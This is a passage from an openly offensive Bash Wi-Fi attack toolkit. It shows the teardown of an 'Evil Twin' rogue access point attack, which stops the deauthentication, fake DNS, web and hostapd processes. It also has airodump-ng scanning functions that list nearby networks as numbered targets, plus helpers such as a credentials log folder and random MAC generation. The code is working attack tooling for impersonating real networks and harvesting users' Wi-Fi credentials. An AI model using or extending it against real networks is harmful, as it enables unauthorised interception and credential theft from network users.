    pkill -f "hostapd" 2>/dev/null
    wait $deauth_pid $dns_pid $web_pid $ap_pid 2>/dev/null
    
    # Restore interface
    ifconfig "$interface" down 2>/dev/null
    sleep 1
    
    # Remove virtual interface if we created it
    if [[ "$interface" == "wlan1ap" ]]; then
        iw dev "$interface" del 2>/dev/null
    fi
    
    clean_temp_dir "$temp_dir"

    success "Evil Twin attack stopped"
}

# Quick scan with numbered selection for Evil Twin
quick_scan_with_numbers() {
    local interface="$1"

    # If no interface provided, try to get one
    if [[ -z "$interface" ]]; then
        interface="${MONITOR_INTERFACE}"
    fi

    # Still empty? Try to find a monitor interface
    if [[ -z "$interface" ]]; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    # Last resort: check for common naming
    if [[ -z "$interface" ]]; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]]; then
        echo -e "${RED}[!] No monitor interface found${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Quick scanning for networks (10 seconds)...${NC}"
    echo -e "${GRAY}[DEBUG] Using interface: $interface${NC}"

    # Check if interface exists
    if ! ip link show "$interface" >/dev/null 2>&1; then
        echo -e "${RED}[!] Interface $interface does not exist${NC}"
        return 1
    fi
    
    # Check if in monitor mode
    if ! iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}[!] Interface $interface is not in monitor mode${NC}"
        echo -e "${YELLOW}[!] Current mode: $(iwconfig "$interface" 2>/dev/null | grep Mode | awk '{print $1,$2,$3,$4}' | head -1)${NC}"
        return 1
    fi

    local scan_file=$(mktemp -t airwings_scan.XXXXXX)
    echo -e "${GRAY}[DEBUG] Starting scan...${NC}"
    timeout 10 airodump-ng --output-format csv -w "$scan_file" "$interface" &
    local scan_pid=$!
    echo -e "${GRAY}[DEBUG] Scan PID: $scan_pid${NC}"

    sleep 10
    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null

    if [[ -f "${scan_file}-01.csv" ]]; then
        echo ""
        echo -e "${WHITE}Detected Networks:${NC}"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"
        printf "${CYAN}%-3s %-20s %-10s %-8s %-6s %s${NC}\n" "#" "BSSID" "Channel" "Power" "Enc" "ESSID"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"

        local count=0
        local network_data=""
        local header_found=false
        
        # Parse CSV file - skip first line (header), process until station section
        local line_num=0
        while IFS= read -r line; do
            line_num=$((line_num + 1))
            
            # Skip header line and empty lines
            [[ $line_num -eq 1 ]] && continue
            [[ -z "$line" ]] && continue
            
            # Stop at station section
            [[ "$line" =~ ^Station.*MAC ]] && break
            

            
            # Simple CSV parsing
            bssid=$(echo "$line" | cut -d',' -f1 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            first_seen=$(echo "$line" | cut -d',' -f2 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            last_seen=$(echo "$line" | cut -d',' -f3 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            channel=$(echo "$line" | cut -d',' -f4 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            speed=$(echo "$line" | cut -d',' -f5 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            privacy=$(echo "$line" | cut -d',' -f6 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            cipher=$(echo "$line" | cut -d',' -f7 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            auth=$(echo "$line" | cut -d',' -f8 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            power=$(echo "$line" | cut -d',' -f9 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            beacons=$(echo "$line" | cut -d',' -f10 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            iv=$(echo "$line" | cut -d',' -f11 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            lan_ip=$(echo "$line" | cut -d',' -f12 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            id_length=$(echo "$line" | cut -d',' -f13 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            essid=$(echo "$line" | cut -d',' -f14 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            key=$(echo "$line" | cut -d',' -f15 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            
            # If essid is empty, try last field
            if [[ -z "$essid" ]]; then
                essid=$(echo "$line" | rev | cut -d',' -f1 | rev | tr -d '"' | xargs)
            fi

            # Validate MAC address
            [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
            
            # Skip empty ESSIDs (unless you want to show them)
            [[ -z "$essid" ]] && essid="[Hidden]"
            
            count=$((count + 1))
            printf "${CYAN}%-3s${NC} %-20s %-10s %-8s %-6s %s\n" "[$count]" "$bssid" "$channel" "${power}dBm" "$privacy" "$essid"
            
            # Store network info for later retrieval (format: "BSSID|Channel|ESSID")
            network_data+="${bssid}|${channel}|${essid}"$'\n'
        done < "${scan_file}-01.csv"

        rm -f "${scan_file}"*.csv "${scan_file}"*.kismet* 2>/dev/null
        
        # If no networks found, show message
        if [[ $count -eq 0 ]]; then
            echo -e "${YELLOW}No networks detected. Try increasing scan time or check adapter.${NC}"
            network_data=""
        fi
        
        # Save network data to fixed temp file for caller to use
        echo "$network_data" > "/tmp/airwings_scan_data.txt"
    else
        echo -e "${RED}[!] Scan failed - no data collected${NC}"
        echo -e "${YELLOW}[!] Check if adapter is in monitor mode${NC}"
        # Clear any existing scan data
        rm -f "/tmp/airwings_scan_data.txt"
    fi
}

# Quick scan helper for target selection
quick_scan() {
    local interface="$1"

    # If no interface provided, try to get one
    if [[ -z "$interface" ]]; then
        interface="${MONITOR_INTERFACE}"
    fi

    # Still empty? Try to find a monitor interface
    if [[ -z "$interface" ]]; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    # Last resort: check for common naming
    if [[ -z "$interface" ]]; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]]; then
        echo -e "${RED}[!] No monitor interface found${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Quick scanning for networks (10 seconds)...${NC}"

    # Kill any existing airodump-ng processes to prevent hanging
    pkill -f airodump-ng 2>/dev/null
    sleep 1

    local scan_file=$(mktemp -t airwings_scan.XXXXXX)
    timeout 10 airodump-ng --output-format csv -w "$scan_file" "$interface" 2>/dev/null &
    local scan_pid=$!

    sleep 10
    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null

    if [[ -f "${scan_file}-01.csv" ]]; then
        echo ""
        echo -e "${WHITE}Detected Networks:${NC}"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"
        printf "${CYAN}%-20s %-10s %-8s %-6s %s${NC}\n" "BSSID" "Channel" "Power" "Enc" "ESSID"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"

        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_len essid key; do
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            power=$(echo "$power" | xargs)
            privacy=$(echo "$privacy" | xargs)
            essid=$(echo "$essid" | xargs)

            [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
            printf "%-20s %-10s %-8s %-6s %s\n" "$bssid" "$channel" "${power}dBm" "$privacy" "$essid"
        done < "${scan_file}-01.csv"

        rm -f "${scan_file}"*.csv "${scan_file}"*.kismet* 2>/dev/null
    fi
}

# ===== Helper constants and utility functions =====

# Colors
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
GRAY="\e[90m"
NC="\e[0m"

# Default directories
LOGS_DIR="${LOGS_DIR:-$PWD/logs}"
mkdir -p "$LOGS_DIR/captures" "$LOGS_DIR/credentials" 2>/dev/null || true

get_timestamp() {
    date +%Y%m%d%H%M%S
}

get_file_size() {
    local f="$1"
    [[ -f "$f" ]] || { echo "0B"; return; }
    du -h "$f" 2>/dev/null | cut -f1
}

pause() {
    read -rp "Press Enter to continue..." _tmp
}

success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

error() {
    echo -e "${RED}[!] $1${NC}"
}

is_monitor_mode() {
    local ifc="$1"
    [[ -z "$ifc" ]] && return 1
    if ! ip link show "$ifc" &>/dev/null; then
        return 1
    fi
    if command -v iw &>/dev/null; then
        iw dev "$ifc" info 2>/dev/null | grep -qi "type monitor" && return 0
    fi
    if command -v iwconfig &>/dev/null; then
        iwconfig "$ifc" 2>/dev/null | grep -qi "Mode:Monitor" && return 0
    fi
    return 1
}

check_vif_support() {
    # best-effort: check if `iw` exists and reports supported interface modes
    if command -v iw &>/dev/null; then
        iw list 2>/dev/null | grep -q "AP" && return 0
    fi
    # fallback: assume true
    return 0
}

is_valid_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

is_valid_channel() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( "$1" >= 1 && "$1" <= 165 ))
}

generate_random_mac() {
    # generate a locally administered unicast MAC (set the 2nd least significant bit)
    local a b c d e f
    a=$(( (RANDOM % 256) | 2 ))
    b=$((RANDOM % 256))
    c=$((RANDOM % 256))
    d=$((RANDOM % 256))
    e=$((RANDOM % 256))
    f=$((RANDOM % 256))
    printf "%02x:%02x:%02x:%02x:%02x:%02x" "$a" "$b" "$c" "$d" "$e" "$f"
}

create_temp_dir() {
    mktemp -d /tmp/airwings.XXXXXX 2>/dev/null || (mkdir -p "/tmp/airwings.$$" && echo "/tmp/airwings.$$")
}

clean_temp_dir() {
    [[ -n "$1" && -d "$1" ]] && rm -rf "$1"
}
